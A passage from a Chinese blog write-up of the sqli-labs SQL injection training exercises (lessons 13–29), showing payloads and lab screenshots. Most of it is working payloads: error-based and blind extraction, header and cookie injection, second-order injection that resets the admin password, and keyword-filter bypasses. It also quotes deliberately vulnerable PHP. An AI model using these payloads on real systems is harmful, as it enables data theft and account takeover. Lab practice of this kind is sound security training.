(extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e)))%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119202440814.png" alt="image-20210119202440814"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>没问题</p><p>那些脚本就能跑出所有东西了</p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>双引号，报错，所以就是用双引号闭合的</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120150310498.png" alt="image-20210120150310498"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(database()),0x7e),<span class="hljs-literal">null</span>) %23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151233322.png" alt="image-20210120151233322"></p><p>爆个表名玩玩</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-literal">null</span>,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database())),null)%23&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151942899.png" alt="image-20210120151942899"></p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>“ 和 ‘ 都没有报错，可能是扣留了报错的信息，比如给php变量前加个 @</p><p>试了一下 <code>uname=&#39; or 1=1%23&amp;passwd=1&amp;submit=Submit</code> 有个图片返回，这就可以说明是否访问成功了，图片叫做flag.jpg</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153249874.png" alt="image-20210120153249874"></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153412704.png" alt="image-20210120153412704"></p><p>尝试出column num 为2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153559333.png" alt="image-20210120153559333"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>不出所料，有个user叫做admin</p><p>那下面就布尔盲注了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">and</span> left(database(),1)=<span class="hljs-string">&#x27;s&#x27;</span>%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>没有报错，只有俩图片</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">uname</span><span class="hljs-operator">=</span>admin<span class="hljs-string">&quot;)%23&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154550935.png" alt="image-20210120154550935"></p><p>一样的，布尔盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&quot;)and left(database(),1)=<span class="hljs-string">&#x27;s&#x27;</span>%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154648013.png" alt="image-20210120154648013"></p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120162728262.png" alt="image-20210120162728262"></p><p>重置密码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&#x27;)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot;)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure><p>都没用</p><p>又想到这是个passwd reset的页面，因此可能用到了update</p><p>可能有类似这样的语句被执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> table_name <span class="hljs-keyword">set</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$passwd&#x27;</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$username&#x27;</span><br></code></pre></td></tr></table></figure><p>因而，passwd处就可能有一个update注入，而且可能是set后面那个值</p><p>试试看报错注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170313456.png" alt="image-20210120170313456"></p><p>那没事了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">uname=admin&amp;passwd=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-literal">null</span>,concat(<span class="hljs-number">0x0a</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database())),<span class="hljs-literal">null</span>)<span class="hljs-meta">#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p>所有表名</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170448801.png" alt="image-20210120170448801"></p><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170623639.png" alt="image-20210120170623639"></p><p>竟然还显示了ip</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">uname</span><span class="hljs-operator">=</span>admin<span class="hljs-variable">&amp;passwd</span>=admin<span class="hljs-variable">&amp;submit</span>=Submit<br></code></pre></td></tr></table></figure><p>还返回了这些User Agent的信息</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171917926.png" alt="image-20210120171917926"></p><p>根据提示，是Header Injection</p><p>看了一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your User Agent is: &#x27;</span> .<span class="hljs-variable">$uagent</span>;<br></code></pre></td></tr></table></figure><p>果然是头部注入，而且可以报错的</p><p>那我就修改一下User-Agent</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171848459.png" alt="image-20210120171848459"></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171837216.png" alt="image-20210120171837216"></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>显示ip</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172155150.png" alt="image-20210120172155150"></p><p>这次是Referer</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172329237.png" alt="image-20210120172329237"></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172315386.png" alt="image-20210120172315386"></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172523016.png" alt="image-20210120172523016"></p><p>估计这回要改cookie了</p><p>源码这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br>.......<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>设置一个名为 uname的cookie</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hello</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175110298.png" alt="image-20210120175110298"></p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>还是cookie，但是更复杂了</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175622603.png" alt="image-20210120175622603"></p><p>看来被base64了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br>......<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>对payload进行base64编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hello</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">aG<span class="hljs-attr">VsbG8</span><span class="hljs-symbol">nIEFORCB1</span>cGRhdGV<span class="hljs-number">4</span>bWwoMSxjb<span class="hljs-number">25</span>jYXQoMH<span class="hljs-name">g3</span>ZSwoc<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>IHVzZXIoKSksMH<span class="hljs-name">g3</span>ZSksMSkj<br></code></pre></td></tr></table></figure><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>双引号</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&quot; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">IiBBTkQgdXBkYXRle<span class="hljs-name">G1</span>sKDEsY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UsKH<span class="hljs-symbol">NlbGVjdCB1</span>c<span class="hljs-number">2</span>VyKCkpLDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UpLDEpIw<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182606166.png" alt="image-20210120182606166"></p><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>熟悉的一个注入点</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182914559.png" alt="image-20210120182914559"></p><p>双引号不会报错，单引号会报错</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183734895.png" alt="image-20210120183734895"></p><p>加个注释，还是报错</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183805290.png" alt="image-20210120183805290"></p><p>而且显示，我加的注释#消失了，估计是replace了</p><p>换其他的试试看–+ 也不行</p><p>那索性就不要注释了，直接用’闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;or+1=1+or&#x27;</span>1<br></code></pre></td></tr></table></figure><p>试试看报错注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;AND<span class="hljs-variable">%20</span>updatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x7e</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>user())<span class="hljs-punctuation">,</span><span class="hljs-number">0x7e</span>)<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)+<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184711508.png" alt="image-20210120184711508"></p><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184852156.png" alt="image-20210120184852156"></p><p>哇，看来是新题型</p><p>注册了个hello，密码也是hello，然后登陆了进去</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120185034544.png" alt="image-20210120185034544"></p><p>登录后，唯一能做的就是改密码</p><p>改密码的时候抓包，估计Auth就是用来辨别身份的</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191401981.png" alt="image-20210120191401981"></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191449447.png" alt="image-20210120191449447"></p><p>成功</p><p>后端修改密码的代码会是怎么样呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);<br></code></pre></td></tr></table></figure><p>可见username直接参与到了sql语句里面</p><p>那就注册一个 <code>admin&#39;#</code> ，然后修改密码，就可以把admin的密码给改掉了</p><p>注册的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>=  <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<br></code></pre></td></tr></table></figure><p>刚好进行了转义，这样就可以顺利存储admin’#账号了</p><p>密码是hello</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195356111.png" alt="image-20210120195356111"></p><p> 接下来进入修改密码的环节</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195644463.png" alt="image-20210120195644463"></p><p>现在，damin的密码就是h了</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195811358.png" alt="image-20210120195811358"></p><p>成功</p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195858667.png" alt="image-20210120195858667"></p><p>提示不能用and 和 or</p><p>还会打印过滤后的字符串</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200020279.png" alt="image-20210120200020279"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>不能and和or好像也不是很重要</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200254725.png" alt="image-20210120200254725"></p><p>但是我的order 被过滤了</p><p>不过无妨</p><p>columns num 为3</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200348685.png" alt="image-20210120200348685"></p><p>该干嘛干嘛</p><p>报错注入照常用</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200641510.png" alt="image-20210120200641510"></p><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200827069.png" alt="image-20210120200827069"></p><p>没有空格和comments了？？</p><p>那就用单引号闭合了，但是看样子or和and都一样被过滤了</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120201610071.png" alt="image-20210120201610071"></p><p>但是，or和and的过滤是可以绕过的，可以用 || 来代替 or ，用 &amp;&amp; 来代替 and</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||(1=1)||&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120202418342.png" alt="image-20210120202418342"></p><p>用报错注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,user(),0x7e))||&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120203759673.png" alt="image-20210120203759673"></p><p>但是当我想用information_schema的时候，却发现or被过滤了</p><p>好像就到此为止了</p><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120205719179.png" alt="image-20210120205719179"></p><p>这次是union和select不能用</p><p>过滤了#，空格，好在这次or没有过滤</p><p>空格可以用特殊字符来绕过<code>%0a</code></p><p>union select 真弄的死死的可能性不大，试试看，最后发现可以大小写绕过</p><p>报错注入，yyds</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210451232.png" alt="image-20210120210451232"></p><p>大小写成功绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(seLect/%0auser()),0x7e),1)||&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210718815.png" alt="image-20210120210718815"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;||updatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x7e</span><span class="hljs-punctuation">,</span>(updatexml(rand()<span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x3a</span><span class="hljs-punctuation">,</span>(SELeCT<span class="hljs-variable">%0</span>aconcat(CHAR(<span class="hljs-number">126</span>)<span class="hljs-punctuation">,</span>group_concat(TABLE_NAME)<span class="hljs-punctuation">,</span>CHAR(<span class="hljs-number">126</span>))<span class="hljs-variable">%0</span>aFROM<span class="hljs-variable">%0</span>ainformation_schema.TABLES<span class="hljs-variable">%0</span>aWHERE<span class="hljs-variable">%0</span>atable_schema<span class="hljs-operator">=</span>database()))<span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span>))<span class="hljs-punctuation">,</span><span class="hljs-number">0x7e</span>)<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)||&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212017879.png" alt="image-20210120212017879"></p><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212108358.png" alt="image-20210120212108358"></p><p>加强了</p><p>一样过滤了#</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;and(1=1)and&#x27;</span>1<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213657517.png" alt="image-20210120213657517"></p><p>可见仅仅是单引号不足以闭合</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213826992.png" alt="image-20210120213826992"></p><p>但是单引号会引起报错，所以肯定有括号没有闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;)and(1=1)and(&#x27;</span>1<br></code></pre></td></tr></table></figure><p>经过尝试，前后都有括号，补上</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213932996.png" alt="image-20210120213932996"></p><p>union和select单独并未被过滤，看来是 <code>union select</code> 被过滤了，而且忽略大小写</p><p>双写绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">unionunion<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212635661.png" alt="image-20210120212635661"></p><p>没有报错回显，所以没法报错注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&#x27;)unionunion<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%09</span><span class="hljs-keyword">select</span>(<span class="hljs-number">1</span>)<span class="hljs-punctuation">,</span>(database())<span class="hljs-punctuation">,</span><span class="hljs-number">1</span><span class="hljs-variable">%09</span><span class="hljs-keyword">and</span>(&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214205371.png" alt="image-20210120214205371"></p><p>可见，即使没法用注释，一样可以union select 注入</p><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214332256.png" alt="image-20210120214332256"></p><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>union select </p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120215925076.png" alt="image-20210120215925076"></p><p>使用超级payload</p><figure class="highlight csharp"><table><tr><td 